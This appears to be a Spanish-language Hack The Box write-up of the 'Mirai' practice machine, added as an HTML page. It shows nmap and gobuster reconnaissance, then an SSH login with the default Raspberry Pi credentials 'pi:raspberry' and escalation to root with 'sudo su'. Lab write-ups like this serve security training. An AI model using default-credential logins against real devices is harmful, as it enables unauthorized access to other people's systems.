@@ -1,0 +1,146 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB-Mirai — themaxterone</title>
+<meta name="description" content="WriteUp de la máquina HTB Mirai – Type: Easy">
+<meta property="og:title" content="HTB-Mirai — themaxterone">
+<meta property="og:description" content="WriteUp de la máquina HTB Mirai – Type: Easy">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="theme-color" content="#07090c">
+<link rel="icon" href="../assets/images/maxteravatar.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/site.css">
+
+</head>
+<body class="post-page">
+<div class="progress" aria-hidden="true"><div id="progress-bar"></div></div>
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="../" aria-label="themaxterone home"><img src="../assets/images/maxteravatar.png" alt="" width="32" height="32"><span><b>~/</b>themaxterone</span></a>
+    <button class="nav-toggle" type="button" aria-label="Toggle menu" aria-expanded="false"><span></span><span></span></button>
+    <nav class="nav-links" id="nav-links">
+      <a href="../">home</a>
+      <a href="../writeups/" class="active">write-ups</a>
+      <a href="../writeups/?cat=Scripts">tools</a>
+      <a href="../about/">about</a>
+      <a class="nav-cta" href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github ↗</a>
+    </nav>
+  </div>
+</header>
+<main>
+<header class="post-head">
+  <div class="wrap narrow">
+    <nav class="crumbs" aria-label="Breadcrumb"><a href="../">home</a> / <a href="../writeups/">write-ups</a> / <span>HTB-Mirai</span></nav>
+    <p class="eyebrow"><span class="dot"></span> machine write-up</p>
+    <h1>HTB-Mirai <img class="title-icon" src="../assets/images/hackthebox.webp" alt="" width="36" height="36"></h1>
+    <div class="card-meta"><time datetime="2022-03-29">Mar 29, 2022</time><span>·</span><span>3 min read</span></div>
+    <div class="chips"><a class="chip" href="../writeups/?tag=HTB">HTB</a><a class="chip" href="../writeups/?tag=Easy">Easy</a></div>
+  </div>
+</header>
+<div class="wrap post-layout">
+  <aside class="toc" aria-label="Table of contents"><p class="toc-title">// contents</p><ol><li><a href="#reconocimiento">Reconocimiento</a></li><li><a href="#explotación">Explotación</a></li></ol></aside>
+  <article class="prose" lang="es">
+<p><img src="../assets/images/writeups/mirai/mirai.png" alt="" loading="lazy"></p>
+<p><a href="https://app.hackthebox.com/machines/64" target="_blank" rel="noopener noreferrer">Maquina</a> </p>
+<h2 id="reconocimiento"><a class="anchor" href="#reconocimiento" aria-hidden="true">#</a>Reconocimiento</h2>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code><span class="hljs-built_in">sudo</span> nmap -sCV --min-rate 5000 -Pn 10.10.10.48 </code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.48
+Host is up (0.038s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
+|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
+|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
+|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
+53/tcp open  domain  dnsmasq 2.76
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.76
+80/tcp open  http    lighttpd 1.4.35
+|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).
+|_http-server-header: lighttpd/1.4.35
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></div>
+<p>Al comprobar que el puerto 80 esta abierto, nos disponemos a ver que se encuentra en él. Cuando entramos se encuentra en blanco, pero podemos usar la herramienta <strong>dirbuster</strong> para explorar el servidor web en busqueda de firectorios y ficheros en el.</p>
+<p>Comando:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>gobuster <span class="hljs-built_in">dir</span> --url http://10.10.29.96/ -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre></div>
+<p>Resultados:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.48/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/03/29 12:27:48 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode
+===============================================================
+/_framework/blazor.webassembly.js (Status: 200) [Size: 61]
+/admin                (Status: 301) [Size: 0] [--&gt; http://10.10.10.48/admin/]
+/swfobject.js         (Status: 200) [Size: 61]                               
+                                                                             
+===============================================================
+2022/03/29 12:28:10 Finished
+===============================================================</code></pre></div>
+<p>Al ver los resultados comprobamos que tiene un directorio <strong>/admin</strong> al cual comprobaremos si hay algo.</p>
+<p><img src="../assets/images/writeups/mirai/pihole.png" alt="" loading="lazy"></p>
+<p>Nos encontramos que hay un panel de administracion llamado <strong>Pi-Hole</strong>
+lo cual nos da una pista de que nos estamos enfrentando a un SO Raspbian.</p>
+<h2 id="explotación"><a class="anchor" href="#explotación" aria-hidden="true">#</a>Explotación</h2>
+<p>Ahora que sabemos a que nos enfrentamos y la &quot;temática&quot; de la maquina, en la botnet de <strong>Mirai</strong> usaban usuarios y credenciales por defecto y las de un dispositivos con este SO son:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>pi:raspberry</code></pre></div>
+<p>Intentamos conectarnos por SSH con estas credenciales.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>sh pi@10.10.10.48 </code></pre></div>
+<p>Y vemos que nos da acceso a la shell de la máquina.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>The authenticity of host <span class="hljs-string">&#x27;10.10.10.48 (10.10.10.48)&#x27;</span> can<span class="hljs-string">&#x27;t be established.
+ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;</span>10.10.10.48<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.
+pi@10.10.10.48&#x27;</span>s password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the
+individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 27 14:47:50 2017 from localhost
+
+SSH is enabled and the default password <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;pi&#x27;</span> user has not been changed.
+This is a security risk - please login as the <span class="hljs-string">&#x27;pi&#x27;</span> user and <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;passwd&#x27;</span> to <span class="hljs-built_in">set</span> a new password.
+
+
+SSH is enabled and the default password <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;pi&#x27;</span> user has not been changed.
+This is a security risk - please login as the <span class="hljs-string">&#x27;pi&#x27;</span> user and <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;passwd&#x27;</span> to <span class="hljs-built_in">set</span> a new password.
+
+pi@raspberrypi:~ $ </code></pre></div>
+<p>Usamos el comando <strong>sudo su</strong> para elevar privilegios y con ello ser root</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>pi@raspberrypi:~ $ <span class="hljs-built_in">sudo</span> su
+root@raspberrypi:/home/pi# </code></pre></div>
+
+
+  </article>
+</div>
+<nav class="wrap narrow pager" aria-label="More posts">
+  <a href="../HTB-Blue/"><span>← older</span>HTB-Blue</a>
+  <a class="right" href="../HTB-Grandpa/"><span>newer →</span>HTB-Grandpa</a>
+</nav>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p><span class="prompt">$</span> echo "stay curious, stay legal"</p>
+    <p class="muted">© 2026 themaxterone · Hack The Box write-ups &amp; tools</p>
+    <p><a href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github.com/themaxterone</a></p>
+  </div>
+</footer>
+<script src="../assets/js/site.js" defer></script>
+</body>
+</html>
